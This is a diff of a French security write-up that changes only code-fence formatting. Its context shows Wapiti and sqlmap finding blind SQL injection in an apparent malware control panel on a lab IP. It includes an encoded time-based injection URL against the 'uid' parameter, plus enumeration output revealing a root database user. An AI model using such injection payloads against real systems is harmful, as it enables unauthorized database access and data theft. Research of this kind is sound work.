@@ -46,7 +46,7 @@ Et si on passe en paramètre les valeurs présentes dans l'analyse de malwr.com 
 
 Aussitôt on lance *Wapiti* qui trouve des failles d'injection MySQL pour presque tous les paramètres :  
 
-```plain
+```
 [+] Lancement du module blindsql
 Faille d'injection SQL en aveugle dans http://192.168.1.57/m/ via une injection dans le paramètre uid
   Evil url: http://192.168.1.57/m/?uid=%27%20or%20sleep%287%29%231&ver=1.14&mk=bb3b62&os=WinXP&rs=adm&c=1&rq=0
@@ -66,7 +66,7 @@ Faille d'injection SQL en aveugle dans http://192.168.1.57/m/ via une injection 
 
 On enchaine avec *sqlmap* sur le paramètre *uid* qui nous présente différentes techniques d'attaque :  
 
-```plain
+```
 sqlmap identified the following injection points with a total of 42 HTTP(s) requests:
 ---
 Place: GET
@@ -87,7 +87,7 @@ Parameter: uid
 
 Les options d'énumération de *sqlmap* fonctionnent bien et permettent de récolter les informations suivantes :  
 
-```plain
+```
 current user:    'root@localhost'
 current database:    'madness'
 
